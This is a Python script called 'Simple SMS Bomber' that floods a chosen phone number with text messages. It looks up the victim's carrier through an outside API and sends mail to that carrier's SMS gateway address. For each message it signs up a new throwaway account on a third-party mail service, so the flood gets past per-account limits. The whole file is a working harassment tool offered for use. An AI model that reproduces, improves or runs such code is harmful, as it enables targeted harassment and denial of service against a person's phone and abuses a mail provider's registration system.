import smtplib
import os
import requests as r
from random import randint
from colorama import Fore

os.system("clear")
print("""
                               ------------------
                               Simple SMS Bomber
                                 Made By Huxal
                               ------------------
""")
password = "bombedurphone123"
pnum = input(Fore.RED + "Target Phone Number: " + Fore.GREEN)
phonelookup = r.get("https://api.apithis.net/numberinfo.php?number=" + pnum).text.split("<br />")
if phonelookup[0] == "Carrier: T-Mobile USA Inc.":
    target = pnum + "@tmomail.net"
elif phonelookup[0] == "Cellco Partnership (Verizon Wireless)":
    target = pnum + "@vtext.com"
elif phonelookup[0] == "Carrier: AT&T Mobility LLC":
    target = pnum + "@txt.att.net"
elif phonelookup[0] == "Carrier: Sprint Corp.":
    target = pnum + "@pm.sprint.com"
else:
    print(Fore.RED + "Error: " + Fore.BLUE + "Unsupported Carrier")
    exit()
subject = input(Fore.RED + "Subject: " + Fore.GREEN)
message = input(Fore.RED + "Message: " + Fore.GREEN)
amnt = int(input(Fore.RED + "Message Ammount: " + Fore.GREEN))
i = 0
print(Fore.CYAN)
while i < amnt:
    i = i + 1
    username = str(randint(100000000000000, 900000000000000))
    msg = '''From: %s\nTo: %s\nSubject: %s\n%s\n
    ''' % (username, target, subject, message)
    r.post("https://danwin1210.me/mail/register.php", data={'user':username, 'pwd':password, 'pwd2':password})
    server = smtplib.SMTP("danwin1210.me", 587)
    server.starttls()
    server.login(username, password)
    server.sendmail(username + "@danwin1210.me", target, msg)
    print(f"Sent Message {str(i)} of {str(amnt)}")
    